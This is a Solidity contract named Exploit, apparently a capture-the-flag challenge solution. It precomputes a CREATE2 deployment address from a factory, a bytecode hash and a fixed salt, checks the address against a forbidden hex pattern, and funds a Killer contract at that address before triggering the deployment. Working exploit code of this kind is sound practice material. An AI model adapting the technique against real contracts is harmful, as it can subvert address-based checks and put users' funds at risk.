pragma solidity 0.8.4;
import "@openzeppelin/contracts/utils/Create2.sol";
import "../console.sol";
import "./Factory.sol";
import "./Challenge.sol";
import "./Spawn.sol";
import "./Killer.sol";

contract Exploit {
    Factory factory;
    Challenge challenge;

    constructor(address _challenge, address _factory) payable {
        challenge = Challenge(_challenge);
        factory = Factory(_factory);
    }

    function check() public {
        bytes memory bytecode = type(Spawn).creationCode;
        bytes32 bytecodeHash = keccak256(bytecode);
        console.logBytes(bytecode);
        console.logBytes32(bytecodeHash);
        console.log(address(factory));
        console.log(address(challenge));
        console.log(address(this));
        console.log(msg.sender);
        // bytes32 salt = bytecodeHash;
        bytes32 salt = 0xe9bfac10ce841c7f4584a4e3cf169847095bb67d8f12a882cb970b8db20c8c81;
        bytes32 _data = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(factory),
                uint256(salt),
                bytecodeHash
            )
        );
        address addr = address(uint160(uint256(_data)));
        console.log(isForbidden(addr));
        console.logBytes20(bytes20(addr));
        console.log(addr);
        new Killer{value: 0.1 ether}(payable(addr));
        challenge.createContract(bytecode, uint256(salt));
    }

    function isForbidden(address _addr) internal view returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"00000000000000000000000000000000000f0b1d";
        bytes20 mask = hex"00000000000000000000000000000000000fffff";

        for (uint256 i; i != 30; ++i) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }
        console.logBytes20(id);

        return false;
    }
}
